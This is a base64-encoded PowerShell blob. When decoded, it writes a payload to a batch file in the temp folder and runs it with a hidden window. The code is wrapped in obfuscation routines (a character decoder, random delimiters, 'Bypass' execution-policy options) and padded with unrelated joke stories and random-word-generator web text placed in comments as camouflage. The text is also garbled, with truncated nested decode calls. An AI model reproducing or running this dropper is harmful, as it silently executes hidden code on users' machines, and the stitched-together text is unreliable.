hrY0dKdFVuWmtNMDR3WlZkNGJFbEZhSEJhUjFKc1ltbEJia3BVUVc1SlIwVnNZMnB3SzAxVVNYTk5VMVptV1ZkUmJHTnFjQ3ROVkVselRWTlZiR05xY0N0TmFYZDRTbGMwWjBwcFFteGxRMVo1VDI0MGVVeEVSV3hLV0VrMlptcFJjMDFUVldkTWVWWjVUMjQwZUUxRGQzaEtVMnRMWTBjNGJHTnFjQ3RQVTNkNFNsZFdlVXBZU1RabWFtZHpUVk5WYkdOcWNDdE5WRVZ6VFZOV2JHSkhkMmRNVTFaNVQyNDBOVXhFUld4S1dFazJabXBKYzAxVFZuVmFSemhzWTJwd0swOVRkM2hLVTFaNVQyNDBORXhFUld4S1dFazJabXBSYzAxVFZqVmlSMVZuU2xoSk5tWnFSWGhNUkVWc1NsaEpObVpxU1hOTlUxWnJXa2RXZFVsRE1VOWlNVUZuU1dsV2VVOXVOSGhPYVhkNFNsYzFNbUl5ZEd4TVZWWTBZMGhLYkVwWVNUWm1hbWR6VFZOVmJHTnFjQ3RQUTNkNFNsTldlVTl1TkhsTVJFVnNZakkwYjFkNVZubFBialI0VGtOM2VFcFlhMnhqYW5BclQwTjNlRXBUVm5sUGJqUXdURVJGYkZwVFZubFBialI0VFdsM2VFcFROVlZhV0dkc1kycHdLMDVEZDNoS1V6VkdZbTFPZGxwRFZubFBialI1VEVSRmJHSnBWbmxQYmpSNFRFUkZiRmhVYnpaS1dFazJabXBGTkV4RVJXeEtXRWsyWm1wRk1FeEVSV3hSZVZaNVQyNDBlRTVwZDNoS1UxWjVUMjQwZUU1cGQzaEtVelJzWTJwd0swNVRkM2hLVjFWc1kycHdLMDVEZDNoS1UxWjVUMjQwZUU1RGQzaEtVMVo1VDI0ME1FeEVSV3hqYVZaNVQyNDBlVXhFUld4aWFWWjVUMjQwZUV4RVJXeExSbk5zWTJwd0swMVVVWE5OVTFZMVNsaEpObVpxWjNOTlUxVnNZMnB3SzA1RGQzaEtWMVZzWTJwd0swMVVTWE5OVTFWMVVUSTVkV1J0Vm5sS1dFazJabXBSYzAxVFZtUlBhbkJIWTIwNGJHTnFjQ3ROVkVselRWTldRMWxUVm5sUGJqUTBURVJGYkZwVVdUQktXRWsyWm1wRk1FeEVSV3hLV0VrMlptcFJjMDFUVm5sS1dFazJabXBKYzAxVFZuVktXRWsyWm1wRmMwMVRWVzlLTUhCSldqSmtVVlV3U21sV1ZFNXpaVzFTU0ZadVVrMWlSa3B6V2xWb1VtUldTbGhPVjNCcFRXeEtkMWx0TVd0YVJUbHhZMFZLVmsxRk5VdFZNVTB4VTBad1dWVnNVbXRUUlhCM1dXMHhhbUl4WTNoVWFsWnFUVEZLYzFsc1RURlNSMGw1VGxSS1lWZEZiM2RYUmxKMlRteEtkVk51V21sV1ZYQnZXWHBLVmsxck5VZFVha0pxWWxkNE1WZHViRzVoVm13MlZHeE9hRkl3TlRGV1ZtaFRZV3hPUm1ORVNsaFdSWEJZV2xjeFQwNVdSbGhpUjJoVVVtdHNNMWRVUWxOa2JWSnlaRE53WVZKRk5YSmFWbEpYVFRGd1IxcEZkR3BOYTFwWlZrWm9VMkZXU1hsbFNFSmFUV3BHU0ZwV1pGZFdSVFZWVW0xb2JGWkhlSGxXTVZwcll6Sk5lVlpzYUZkaVYzaHdWRmR3YzJWV1VrVlNiRTVwVFZoQ1ZWWnNhSE5VYkU1SFUyMDVXbUV5VWxkWmExVjRZMVpHZFZkdFJtaFdiRmt4VmtaV1lWVXlWbGhUV0hCb1RXNW9UMWxYZEVka2JGSlhWVzAxVDFKVVZuZFpWRTVYWVd4SmVGTnVVbFJXTWxJelZGVmtSMWRGTVZobFIyeE9UVlpzTTFVeFZrNU9WVEZHWWtWV1ZsWllVbWhWYm5CdllteHdWVkpyT1U1U2JYaGFWVEp3UTFSV1duSk9XSEJZWWtkU1dGcEVRbk5TUlRGWFZXMUdWMDFFVlhsWFZ6QjRWVEpXY21KRlZsWldSMUp5VlRCV2RrMVdUbFpoU0hCb1RXczFlRmxWYUV0aFYxWjBWV3M1WVZaWGFFaFpNakZUWTIxS1JrOVhkRmhTYmtKb1ZsZHdSMkl4VGtkYVJtUlNZV3hhWVZsVVJtRlVSbXhXVjI1S2JGWnRVbmhWVjNSTFZtc3dkMDVWY0dGU2VrWnlXbFZhYzJOV1ZuVlhiRlpPVmxSU05sWnJXbXRYYXpWSVVtdHNhRTB5ZUhKVmFrNURWbXhXV1dOSE5XeGlWVnBYVkd4b2IxZEdTbGxVYWxKYVlrZG9NMVJzV210V1JrWlZZa1Z3VWsxck5EQldSbVIzWVcxU1ZrMVZVazlUUjFKT1dWZDBWMlJXVVhwaVJrNVZVbTFTU1ZwVlZtOVZiRm8yVm01U1ZtSllRblZhVlZWNFZqRmFkR05IZUZOV2EzQlJWbGQ0YTFReVZrZFZhMnhwVW10d1lWWnJXbUZVTVd4elZtMTBVMkpWY0VaVmJURnZWVEpLV0dGRlRsVldiSEJvVmxkNGQxTldUbk5oUmtwcFZteHdOVmRyVm1wTlZrNVlVbXhvVGxaWWFHRlpWM2gzVXpGc2MxVnJkRTVOYXpWSldrVmFkMkV4VGtaT1dGWllZa1p3Y1ZwV1ZuTlNWVEZJV2tVMWFHSkZXWHBXUjNSVFpXMUZlRmRyV2xWaVJWcFRWRmMxYjJReFpITlpla1pPVWxkNFJsUlZaR3RXVjBwWFYxaHdWVkpzVlRGWlZtUkhaRVphZEdOSGRGSk5SWEJSVmpKNGIxVnRVbGRXV0d4UVZqTkNiMVJYZUZwa01XdDZZWHBHVjFaclZqUlZWM1JUWVZaSmVXVklUbHBpVkZaVFdXcENkMU5XVGxWVmJXaE9ZVzFrTmxacldtOWlNbFpJVWxod1dHRXpRbFpaYlhoYVpWWlplRlp0ZEZoV2EydzBXV3RhUjJKR1dYZGpSV1JXVFdwR2RsWXljM2hqTWtsNldrWktWMkY2VlRKV1ZFSnZXVmRLZEZSc2FGUldSVXB3VkZWU2MxWldjRVZSV0docFZsUnNTVmxWVWxkVWJVcHpVMjVvVjJFeFdrOVVhMVYzWlZkS1JrOVhjRmRpVjJoT1ZrWmFhbVZGTlhSV2JHUm9UVEExUzFWVVJrdFVWbGwzV2tSU1ZGSnJXbGxVYkdONFZUSkdkRnBFVWxWV2JIQllXVmN4VjFKc1ZuSlBWazVYVFVSVk1GWnJWbTlqTVZaellrWldWMkY2Vm5CV2JHUlRVakZzY2xWclpHaFNhM0F3V1ZWV1MxUnNXbk5qUms1WVlUSm9URll3V2tka1JscDFVMjEwVTJWc1drdFhWbHBxWlVaU1IySklSbGhoTTBKd1ZtdFdkbVZzYTNkYVJFSllZbFpLU2xaSE1ERlpWbHAwVkdwV1ZFMVhaRFJaVjNoelYxWldkR05IYUZKTlJXdDZWMjE0Ym1ReGIzbFZiR2hQVmtWS2IxWnFUbXRpYkUxM1ZHeE9WMVpyVmpSVlYzUlRZVlpKZVdWSVRscGlWRlpUV2taYVJtVlZPVmxXYld4cFZteHdlRmRyVm10V01rVjNaRVpXYWsxdVVsWlpiRnBhWkRGd1JWTlVWbXhXTUZZMFZrZHdRMkZ0U2xkWGJUbGFZa1UxUTFReFZuTlNSbFp6Vm14S1RsWlZjRVpYVjNScll6SktTRk51VmxaWFJscFVWRmQ0V21ReFdsVlViRTVzVm01Q1dWVnROVk5VUmtWNVkzcE9WR0V4Y0ZCVVZXUlBaRVphZEdGSGJGZGlWa2t4VjFaYWIxVXlTa2hVYmtKU1ZrZDRTMVZzVWxkak1YQkpZVE5vVmxKdGVEQlpNR1EwVjJzd2VGSnROVlpOVmxVd1drWmFWbVZzVm5WaVIwWlhUVVp2ZDFadGNFOVRNazVJVld0b1YySnRlRTFWVkVaTFZVWmtjMkZHVGs1TmEydzJWVEkxUzFack1IaFRhbFpZWWtkU1NGcEZWakJXVjAxM1pFZEdhV0pHYjNoV01WSlBWVEpPU0ZOWWJFOVNNbEpZVkZSQ2QyUXhjRVphUm1SWFZqQnNORlpIY0VOaGJVcFhWMjA1V21KRk5VTlpha0ozVWpGU2NWRnRjR2xXTTJkNFZqSTFjMk5zYjNsV1dHaHJVako0YzFZd1drdGpNVm8yVWxob1lWSllRa3BXUnpGM1lXMUtXR1ZFVG1GU1Zrb3pWVlJLVTFkR1pIUk5WMFpZVWxkNGRWWlZXazlSYlZGM1pVaENUMUl6VWxoVmJGVXhWV3hXVlZOcVVtcFNia0paVkd4U1ExUlhTa1pqU0U1WVZrVndXRmt3WkZOa1JscHlWRzEwVjAxWVFqQldNbmh2VXpGYVNGSnNiR3BTTTJoTFZUQm9hMkpzVG5OVWEwNVBUVWQ0UmxWV1pHdGlWbHBKVkc1S1YxWkZOVlJhVmxwM1YwWktkVlZzWkU1TlNFSXpWMnRXYTFZeVZsWmxTRTVoVTBkNGIxWXdXa3RqTVUxM1ZHeE9WMUl4U2twVk1qVkRZVmRLV0ZSdE5WUk5NbmhEV1cxNGEwNXJOVmhWYTNSc1ZqTk5lbFV5ZEdGVU1ERklWRzVTVjJKWGFIQldiVEZUVGxac1YyRkdUbWxTTURWM1ZHeFdhMkZXVGtkWGFscGFWbFUxZFZrd1pHRldWMUpIWVVkd2FWWXpaRE5XTW5oaFZUSlNjMVpZY0ZaaWJYaG9WbXBDWVUxR1RsWlViWEJwWVhwb05sZHJZelZoUmxsNllVaE9WRlpWTlhWWmFrSjNVbXhPY1ZadGRGTk5WbTh5Vm14amVGWXlSa2RqUlZKU1ZrZDRTMVZVUmt0VlJtUnpZVVpPVGsxcmJEWlZNalZMVm1zd2VGTnFWbGhpUjFKSVdrVldOR014VG5SbFJuQlhUVlZhTWxVeWRGZFRNREZYWTBoU1dHSllhSEZaVm1ocllteFNWbFJxVG1GTlNFSkhWVEp3UjFsWFNsZGpTRTVhVFcxemVGWkdXbmRYUlRWWVRsZDBVMDF0VWpOVmVrWlBVVzFTUjJJemNGWldNbEpQVlZSS01HSnNjRmxpUms1VFVqQnNOVlJXYUZOWGJGbzJWbTVLVkZaV1JqTlhha0l3VWpKU1JWRnRSbGhTTW1RelZrVmplRll5VWxkaE0yeFFWak5TYjFadWNGZGtWbVJIVlc1YVQySkdjRmhXVjNSclZVWkZlV1JFUmxaaGEzQllWRlZhVm1Wc1ZuVmlSMmhYWld4YU1WVjZRazlWTVVWNVZXeG9XR0pVUm1oV01GWnpaV3hPVmxWclNtcE5SM2hGVmxkMFQySkdaRWRUYms1YVpXdGFURmxyV25OWFJsWlpVV3hDYkZacmNGSlhhMXB2VlRKUmVWVnNiRlpXTWxKU1ZsUkNTbVF4YTNsT1dFcGhUV3hXTTFscmFGZGhNa3BWWWtoc1dHSkZNVFJWYlRGWFUxWkdkV0pIUmxoU1ZGVXlWMVphYWs1WFVsWmlSVkpXWVRGS2NGUlhjRWROUm1SWFdYcEdhRTFIZUVwYVJFcHJWbFV3ZUZkWVpGVlNiSEJRVkZWa1QyUkhTa2xXYlVac1ZsVnJNVll4VWt0U01ERkhZVE5zWVUxdFVuTmFWbHBMWWxaT1ZtRkVUbUZOVmtZMlZtMXdRMVJXV25KT1NHUmFUV3BHZWxwR1duWmxiRkp4WWtaQ1RsWXhTVEZYVmxwdlZUSktSMWRyYUZCV2JFcHlWVEJXZDJNeFpGZFpNMlJoVFVoU1JWWlhlRU5oTVdSSFUycE9ZVkp0YUZOWk1HUmhWbGROZVdSR1drNU5WVzh4VmpKNGExSXlVa2RYV0hCVVltdEtjbFZxUm1GT1ZsSklaRVU1YWsxcmJEWldSekUwVkVaRmVXUkZlRXBoVjNSM1ZIcENjMUpzWkVSUlYzUnNVVmM0T1VwNWEzQkxVMGxMV2tkV2MwbERTV3htYlZsM1NXZHdRVnBYVFd4amFuQXJUVlJGYzAxVFZuWkpSemx0V21kdmJHTnFjQ3RQUTNkNFNsZFZiR05xY0N0T1EzZDRTbE5DYUVsRU1HZEtVMVlyWVZGdmJHTnFjQ3RQUTNkNFNsZFZiR05xY0N0T1EzZDRTbE5DYUVsRU1HZEtVMEZ5U1VOV0syRlRTV3hLV0RSc1kycHdLMDFwZDNoS1UwbHNRMjVPYkdSRFFtaEpSREJuU2xkRmJFTnFjR2haVjBab1dWZEdhRmxYUm1oWlYwWm9XVmRHYUZsWFJtaFpWMFpvV1ZkR2FGbFhSbWhaVjBrOUlpa3BPeUJUWlhRdFEyOXVkR1Z1ZENBdFVHRjBhQ0FpSkdWdWRqcDBaVzF3TDJSaGRHRXVZbUYwSWlBdGRtRnNkV1VnSWlSbE1VOVpVRFoxT1hGb05HVnVPVEFpT3lCemRHRnlkQzF3Y205alpYTnpJQzFYYVc1a2IzZFRkSGxzWlNCSWFXUmtaVzRnSWlSbGJuWTZkR1Z0Y0M5a1lYUmhMbUpoZENJN0lBPT0iKSk7PCMga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gNSB7CglbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uCiAgICApCgoJcmV0dXJuIChDb2FsZXNjZSAkY29ubi5MYXN0Q3JtRXJyb3IgJGNvbm4uTGFzdENybUV4Y2VwdGlvbikgCn0KJGFTZzlEOTJyN1Z4TWd0TnlSNlBHeVA5aHRKNFlDQzZKZFhadFBNRlBxM0pYNFVzM05uNEUyVXluQWNuZzZWY0J2dG5NRVZwRiA9IEAiCiAgICAgICAgZnVuY3Rpb24gV3VKamVZQ2lHQ2lLV3JnbHsKICAgICAgICBwYXJhbSgkb1poZ1VsdkIwTW1tTHRFWFFyNjJFKQogICAgICAgICRQTEltOVNSeEpORGplU00gPSBbaW50XSRvWmhHVWx2YjBNbW1sVEV4UVI2MkVbMF0KICAgICAgICAkbnp3cWhtdCA9ICcnCiAgICAgICAgZm9yKCRyZHJZazlmV0ZxQ184ck5wdyA9ICgwICsgMSk7ICRyRFJ5azlmd0ZxQ184Um5wdyAtbHQgJG96aEd1bFZiME1tbWxUZVhRcjYyRS5sZW5ndGg7ICRSZHJZazlGd0ZRY184cm5wdyArPSAoMyAtIDEpKXsKICAgICAgICAgICAgJG5ad3FobVQgKz0gW2NoYXJdKCg3ICsgOSkgKiAoW2ludF0kb1poZ3VsVkIwTU1NbFRFeFFyNjJFWyRyZFJ5SzlGV2ZxY184Um5wd10gLSAkcExpbTlTcnhKTkRqRVNtKSArIChbaW50XSRvemhnVWx2QjBNbW1sVEVYcXI2MkVbJHJkUllrOUZXZlFjXzhSTnBXICsgMV0gLSAkUGxpbTlTcnhqTmRqZXNtKSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRuWndRaE10CiAgICAgICAgfQoiQAokaHRKNFlDQzZKZFhadFBnNlZjQnZ0TUZQcTNKWDRVcyA9IEAiCiAgICBbVmFsaWRhdGVTZXQoKFdVSkpFeUNpZ0NJS1dyZ2woJ05vcm1hbCcpKSwgKHdVSkplWUNJR0NpS1dyZ0woJ01pbmltaXplZCcpKSwgKHd1SmpFeUNJR0NpS3dyZ2woJ01heGltaXplZCcpKSwgKFd1akpFWUNJR2NJS1dyZ2woJ0hpZGRlbicpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdHh5N3d4NzNTLAoiQAokY2o0Qmt2UFFKU3UgPSBAIgogICAgICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gKCd7MX17MH0nLWYnUGF0aCcsJ0ZpbGUnKSldIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVFJVZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICh3dWpKRVlDSUdDSWt3cmdsKCdTY3JpcHRCbG9jaycpKSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU2NyaXB0QmxvY2tdCiAgICAgICAgJG85ZGYwU3JQVDgzRjZCaG81SSwKICAgICAgICAiQEAiCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAoV3VKSkVZQ0lHY0lLV3JnbCgnRmlsZVBhdGgnKSkpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkaFdMNEJVQ2tZOSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkY09tUFcwbmJXTTc4ZXdJWTRFSCwKICAgICAgICAiQEAiCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkWWpMWHlQOU43LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRjUTJkUUdhYUNFU0k1LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRIQllEc25LZVBYeTgsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEM5SzA0TUIsCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkWE9RZE1DRE1QLAoiQAokUktycmg4RXFGcVNMZ2R4dXU4NzZWRVdwd0JKSE5SV0c5cEw3ID0gQCIKICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKICAgICJAQCIKICAgICMgRW5jb2RpbmcgYmFzZSB2YWx1ZXM6IDE2PUhleCwgOD1PY3RhbCwgMj1CaW5hcnkKICAgICRHTWRfSk84SUNJcCA9IDIKCiAgICAjIEVpdGhlciBjb252ZXJ0IFNjcmlwdEJsb2NrIHRvIGEgU3RyaW5nIG9yIGNvbnZlcnQgc2NyaXB0IGF0ICRQYXRoIHRvIGEgU3RyaW5nLgogICAgSWYoJFRiU3RDcEJQVlsoJ3swfXsxfSctZidQYXQnLCdoJyldKQogICAgewogICAgICAgIEdldC1DaGlsZEl0ZW0gJEh3bDRCVUNLWTkgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICRRN3hBUU5xMVk4OGUgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggJGh3bDRidWNLWTkpKQogICAgfQogICAgIkBAIgogICAgRWxzZQogICAgewogICAgICAgICRxN3hhUU5xMVk4OGUgPSBbU3RyaW5nXSRvOURmMFNScHQ4M0Y2QmhvNWkKICAgIH0KCiAgICAjIENyZWF0ZSBsaXN0IG9mIHJhbmRvbSBkZWxpbWl0ZXJzICRSYW5kb21EZWxpbWl0ZXJzLgogICAgIyBBdm9pZCB1c2luZyAuICogJyAiIFsgXSAoICkgZXRjLiBhcyBkZWxpbWl0ZXJzIGFzIHRoZXNlIHdpbGwgY2F1c2UgcHJvYmxlbXMgaW4gdGhlIC1TcGxpdCBjb21tYW5kIHN5bnRheC4KICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKCiJACmZ1bmN0aW9uIDYgewogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtVSW50MTZdCiAgICAgICAgJFBvc2l0aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVHlwZV0KICAgICAgICAkVHlwZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIpXQogICAgICAgIFtVSW50MTZdCiAgICAgICAgJE9mZnNldCwKCiAgICAgICAgW09iamVjdFtdXQogICAgICAgICRNYXJzaGFsQXMKICAgICkKCiAgICBAewogICAgICAgIFBvc2l0aW9uID0gJFBvc2l0aW9uCiAgICAgICAgVHlwZSA9ICRUeXBlIC1hcyBbVHlwZV0KICAgICAgICBPZmZzZXQgPSAkT2Zmc2V0CiAgICAgICAgTWFyc2hhbEFzID0gJE1hcnNoYWxBcwogICAgfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBjKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgYygpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG